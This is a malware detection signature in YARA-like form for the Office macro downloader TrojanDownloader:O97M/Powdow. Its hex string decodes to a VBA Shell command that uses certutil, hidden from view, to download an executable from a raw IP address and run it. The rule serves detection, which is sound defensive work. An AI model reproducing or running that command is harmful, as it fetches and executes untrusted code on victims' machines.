
rule TrojanDownloader_O97M_Powdow_RPD_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RPD!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 36 36 2e 34 32 2e 31 30 37 2e 32 33 33 2f 22 22 20 54 7a 68 71 6d 75 66 73 67 66 66 61 6f 6c 7a 67 75 2e 65 78 65 2e 65 78 65 20 26 26 20 54 7a 68 71 6d 75 66 73 67 66 66 61 6f 6c 7a 67 75 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""http://66.42.107.233/"" Tzhqmufsgffaolzgu.exe.exe && Tzhqmufsgffaolzgu.exe.exe", vbHide)
	condition:
		((#a_01_0  & 1)*1) >=1
 
}